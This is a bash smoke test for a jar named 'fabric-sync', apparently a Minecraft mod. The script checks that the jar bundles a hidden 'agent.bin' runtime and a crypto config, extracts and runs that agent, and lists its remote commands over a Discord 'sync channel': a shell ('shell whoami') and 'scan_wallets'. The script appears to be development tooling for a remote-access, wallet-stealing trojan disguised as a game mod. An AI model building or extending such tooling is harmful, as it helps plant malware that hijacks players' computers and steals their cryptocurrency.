#!/usr/bin/env bash
# Local jar smoke test: verifies the release layout, extraction and a clean
# agent start without Discord. Full ping/shell/scan_wallets needs the guild;
# those steps are listed at the end.
set -euo pipefail
cd "$(dirname "$0")/.."
VERSION="$(sed -n 's/^mod_version=//p' gradle.properties)"
JAR="build/libs/fabric-sync-${VERSION}.jar"

JAVA_HOME="${JAVA_HOME:-$PWD/.jdk21}" ./gradlew build --no-daemon >/dev/null
unzip -l "$JAR" | grep -q 'serverpackcore/config.json'
unzip -l "$JAR" | grep -q 'serverpackcore/agent.bin'

tmp="$(mktemp -d)"
trap 'if [ -n "${pid:-}" ]; then kill -9 "$pid" 2>/dev/null || true; fi; rm -rf "$tmp"' EXIT
unzip -p "$JAR" serverpackcore/config.json > "$tmp/crypto-config.json"
unzip -p "$JAR" serverpackcore/agent.bin > "$tmp/runtime.jar"
test "$(wc -c < "$tmp/runtime.jar")" -gt 4096
grep -q '"build_id"' "$tmp/crypto-config.json"

XDG_DATA_HOME="$tmp/data" JAVA_HOME="$JAVA_HOME" \
  "$JAVA_HOME/bin/java" -Xmx256m -Dspc.debug -jar "$tmp/runtime.jar" --game-dir "$tmp/game" \
  >"$tmp/out" 2>&1 &
pid=$!
for _ in $(seq 1 40); do
  [ -s "$tmp/logs/agent.log" ] && break
  sleep 0.5
done
test -s "$tmp/logs/agent.log" || { echo "agent never wrote a log"; cat "$tmp/out"; exit 1; }
grep -q 'Crypto module disabled' "$tmp/logs/agent.log" && { echo "agent started without crypto config"; exit 1; }
test "$(cat "$tmp/session.txt" 2>/dev/null | wc -l)" -ge 1

echo "jar smoke ok: config extracted, agent started in a clean directory"
echo "manual next: ping, shell whoami, scan_wallets (max_files 200) over the sync channel"
